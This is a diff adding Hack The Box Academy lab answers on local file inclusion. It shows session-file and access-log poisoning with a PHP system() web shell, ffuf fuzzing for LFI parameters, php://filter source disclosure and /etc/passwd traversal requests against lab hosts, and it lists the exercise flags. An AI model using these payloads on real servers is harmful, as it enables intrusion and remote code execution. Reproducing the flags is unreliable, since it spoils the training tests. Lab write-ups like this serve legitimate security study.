@@ -7083,11 +7083,267 @@ http://94.237.59.180:49225/index.php?language=./profile_images/shell.gif&cmd=cat
 Results: HTB{upl04d+lf!+3x3cut3=rc3}
 
 
+**Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd**
+
+**1.** Reading the log. I we have the following PHPSession cookie:
+
+```
+Cookie: PHPSession=giiat46h4vo3robfrnoet7neqf
+```
+
+Then, its location on disk would be:
+
+```
+# Linux
+/var/lib/php/sessions/sess_giiat46h4vo3robfrnoet7neqf
+
+# Windows
+C:\Windows\Temp\sessions\sess_giiat46h4vo3robfrnoet7neqf
+C:\Windows\Temp\sess_giiat46h4vo3robfrnoet7neqf
+```
+
+Now, from the endpoint vulnerable to LFI, we can read the log for our session:
+
+```
+http://94.237.54.42:37338/index.php?language=/var/lib/php/sessions/sess_giiat46h4vo3robfrnoet7neqf
+```
+
+Screenshot:
+
+![Read session](img/log-poisoning_00.png)
+
+
+We can write the logs with the language parameter. 
+
+**2.** Write the logs with the following malicious payload:
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+whereas the payload is url encoded:
+
+```
+<?phpsystem($_GET["cmd"]);?>
+```
+
+**3.** Execute the shell:
+
+```
+http://94.237.54.42:37338/index.php?language=/var/lib/php/sessions/sess_giiat46h4vo3robfrnoet7neqf&cmd=ls
+```
+
+![](img/log-poisoning_01.png)
+
+Executing the shell requires writing the shell into the log every time (step 2).
+
+
+Results:
+
+ **Try to use a different technique to gain RCE and read the flag at /**
+ 
+**1.** As we have located a LFI vulnerability, we can read the `access.log` file:
+
+```
+http://94.237.54.42:37338/index.php?language=/var/log/apache2/access.log
+```
+
+The log contains the remote IP address, request page, response code, and the User-Agent header.
+
+
+**2.** The User-Agent header is controlled by us through the HTTP request headers, so we should be able to poison this value. We can do it with Burpsuite or via curl:
+
+```shell-session
+curl -s "http://94.237.54.42:37338/index.php" -A "<?php system($_GET['cmd']); ?>"
+```
+
+**3**. Executing the payload:
+
+```
+GET /index.php?language=/var/log/apache2/access.log&cmd=ls+/ HTTP/1.1
+Host: 94.237.54.42:37338
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: uid=96; PHPSESSID=giiat46h4vo3robfrnoet7neqf
+Upgrade-Insecure-Requests: 1
+
+```
+
+
+```html
+GET /index.php?language=/var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt HTTP/1.1
+Host: 94.237.54.42:37338
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: uid=96; PHPSESSID=giiat46h4vo3robfrnoet7neqf
+Upgrade-Insecure-Requests: 1
+```
+
+Results: HTB{1095_5#0u1d_n3v3r_63_3xp053d}
+
+
 ### Automation and Prevention
+
+
+ **Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt**
+
+**1.** We will first locate a vulnerable parameter fuzzing with ffuf:
+
+```
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.59.180:38511/index.php?FUZZ=value' -fs 2309 
+```
+
+Output: 
+
+```
+view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 50ms]
+```
+
+**2.** Now we will determine the webroot server:
+
+
+```
+ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://94.237.59.180:38511/index.php?view=../../../../FUZZ/index.php' -fs 2309
+```
+
+Output:
+
+```
+
+srv/www/html/           [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
+home/httpd/             [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
+home/$USER/public_html/ [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
+home/$USER/www/         [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
+var/www/public/         [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
+home/www/               [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
+var/www/sites/          [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 38ms]
+var/www/                [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
+var/www/public_html/    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 37ms]
+var/www/html/default/   [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 38ms]
+srv/www/                [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 345ms]
+var/www/html/           [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1369ms]
+srv/www/sites/          [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1369ms]
+```
+
+Enumerate potential files
+
+```
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.59.180:38511/index.php?view=../../../../FUZZ' -fs 1935
+
+```
+
+Output:
+
+```
+../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 35ms]
+../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 36ms]
+../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 35ms]
+../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 40ms]
+../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 40ms]
+../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 41ms]
+../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 35ms]
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 35ms]
+../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 40ms]
+../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 40ms]
+```
+
+
+Print the flag.txt
+
+```
+http://94.237.59.180:38511/index.php?view=../../../../../../../../../../../../../../../../../../../../../../../../../flag.txt
+```
+
+Results: HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
+
+
+**What is the full path to the php.ini file for Apache?**
+
+```
+ssh htb-student@$ip
+find / -name *php.ini 2>/dev/null
+```
+
+Results: /etc/php/7.4/apache2/php.ini
+
+**Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ______ reasons.**
+
+```
+ssh htb-student@$ip
+sudo su
+nano /etc/php/7.4/apache2/php.ini
+
+# Locate the disable_functions Directive: Search for the line that starts with disable_functions (if it exists). 
+# Edit the disable_functions Directive
+disable_functions = system
+
+
+```
+
+Results: security
+
 
 
 ### Skills Assessment
 
+**Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.**
+
+```
+# After fuzzing a little, we find the following exploitable parameter. 
+http://83.136.250.116:48690/index.php?page=about
+
+# The payload allows us to read php files with a php wrapper base64 encoded:
+http://83.136.250.116:48690/index.php?page=php://filter/read=convert.base64-encode/resource=index
+```
+
+See the screenshot below:
+
+![](img/file-inclusion.png)
+
+After decoding it we can read the source code for the index.php page and notice a commented line with the following path within the application:
+
+```
+/ilf_admin/index.php
+```
+
+This opens an entire new world: 
+
+![](img/file-inclusion_01.png)
+
+whereas we can basically read any file of the application by tampering the parameter `log`:
+
+![](img/file-inclusion_02.png)
+
+This way, we get access to the `/var/log/nginx/access.log` file and realize that we can write into it by using the `User-agent` header request. For example, this request:
+
+![](img/file-inclusion_03.png)
+
+... then can be executed:
+
+```HTML
+GET /ilf_admin/index.php?log=../../../../../../var/log/nginx/access.logfile&cmd=ls+/ HTTP/1.1
+Host: 83.136.250.116:48690
+User-Agent: <?php system($_GET['cmd']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+```
+
+![](img/file-inclusion_04.png)
+
+Printing the flag.txt file:
+
+```
+http://83.136.250.116:48690/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log?cmd=cat+flag_dacc60f2348d.txt
+```
+
+Results: a9a892dbc9faf9a014f58e007721835e
 
 
 ## [File Upload Attacks](https://academy.hackthebox.com/module/details/136)
